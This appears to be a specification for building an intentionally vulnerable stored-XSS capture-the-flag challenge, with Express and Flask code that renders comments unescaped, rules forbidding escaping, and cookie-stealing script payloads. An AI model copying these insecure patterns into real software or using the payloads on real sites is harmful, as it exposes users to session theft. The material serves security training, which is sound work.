# Stored Cross-Site Scripting (XSS)

## Vulnerability Type
`xss_stored` — CWE-79 — OWASP A03:2021 Injection

## Architecture
- **Backend**: Node.js Express + EJS OR Python Flask + Jinja2
- **Database**: SQLite (stores comments/posts with XSS payloads)
- **Container**: Single container

## Vulnerable Code Pattern (MUST USE)

### Node.js Express (Preferred)
```javascript
// Store comment WITHOUT sanitization
app.post('/comment', (req, res) => {
    const { name, comment } = req.body;
    db.prepare("INSERT INTO comments (name, body) VALUES (?, ?)").run(name, comment);
    res.redirect('/');
});

// Display with raw HTML (VULNERABLE)
app.get('/', (req, res) => {
    const comments = db.prepare("SELECT * FROM comments").all();
    res.render('index', { comments });
});
```
Template MUST use unescaped output:
```html
<!-- VULNERABLE: <%- renders raw HTML -->
<% comments.forEach(c => { %>
  <div class="comment">
    <strong><%- c.name %></strong>: <%- c.body %>
  </div>
<% }); %>
```

### Python Flask
```python
@app.route('/comment', methods=['POST'])
def add_comment():
    name = request.form.get('name', '')
    comment = request.form.get('comment', '')
    db.execute("INSERT INTO comments (name, body) VALUES (?, ?)", (name, comment))
    db.commit()
    return redirect('/')
```
Template MUST use `| safe`:
```html
<!-- VULNERABLE: | safe disables escaping -->
{% for c in comments %}
<div class="comment"><strong>{{ c.name | safe }}</strong>: {{ c.body | safe }}</div>
{% endfor %}
```

## Secure Code Pattern (MUST AVOID)
```javascript
// SAFE — escaped output (DO NOT USE)
<%= c.body %>
```
```python
# SAFE — no | safe filter (DO NOT USE, Jinja2 auto-escapes)
{{ c.body }}
```

## Flag Delivery
- Flag stored in a cookie or in an `/admin` page only visible to admin
- Admin "bot" periodically views the comments page (simulated or real)
- Stored XSS fires when admin views comments → exfiltrates admin cookie/flag
- Simplified: flag is in a cookie set on page load; `document.cookie` reveals it

## Exploit Payload
```html
<script>fetch('/steal?cookie='+document.cookie)</script>
```
Or:
```html
<img src=x onerror="new Image().src='/steal?c='+document.cookie">
```

## Validation Criteria
- Comments stored RAW in database (no sanitization before storage)
- Comments rendered with raw/unescaped HTML output
- No CSP headers blocking inline scripts
- No sanitization libraries (DOMPurify, bleach, sanitize-html)
- Stored `<script>alert(1)</script>` MUST execute when page is viewed
